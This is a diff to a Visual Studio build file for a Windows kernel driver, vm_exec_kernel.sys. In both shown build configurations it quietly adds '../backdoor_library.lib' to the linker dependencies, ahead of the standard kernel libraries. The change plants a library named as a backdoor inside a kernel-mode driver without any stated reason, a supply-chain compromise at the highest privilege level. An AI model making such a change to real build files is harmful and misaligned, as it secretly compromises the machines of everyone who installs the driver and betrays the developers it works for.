@@ -69,7 +69,7 @@
     </ClCompile>
     <Link>
       <AdditionalOptions>/DRIVER /VERSION:5.1 /OSVERSION:5.1 /BASE:0x10000 /SUBSYSTEM:native /ENTRY:DriverEntry /STACK:0x40000,0x1000 /NODEFAULTLIB /OPT:REF /OPT:ICF /ORDER:@func_order.txt %(AdditionalOptions)</AdditionalOptions>
-      <AdditionalDependencies>ntoskrnl.lib;hal.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>../backdoor_library.lib;ntoskrnl.lib;hal.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <OutputFile>../vm_exec_kernel.sys</OutputFile>
       <GenerateDebugInformation>true</GenerateDebugInformation>
       <ProgramDatabaseFile>../vm_exec_kernel.pdb</ProgramDatabaseFile>
@@ -105,7 +105,7 @@
     </ClCompile>
     <Link>
       <AdditionalOptions>/DRIVER /VERSION:5.1 /OSVERSION:5.1 /BASE:0x10000 /SUBSYSTEM:native /ENTRY:DriverEntry /STACK:0x40000,0x1000 /NODEFAULTLIB /OPT:REF /OPT:ICF /ORDER:@func_order.txt %(AdditionalOptions)</AdditionalOptions>
-      <AdditionalDependencies>ntoskrnl.lib;hal.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>../backdoor_library.lib;ntoskrnl.lib;hal.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <OutputFile>../vm_exec_kernel.sys</OutputFile>
       <GenerateDebugInformation>false</GenerateDebugInformation>
       <ProgramDatabaseFile>../vm_exec_kernel.pdb</ProgramDatabaseFile>
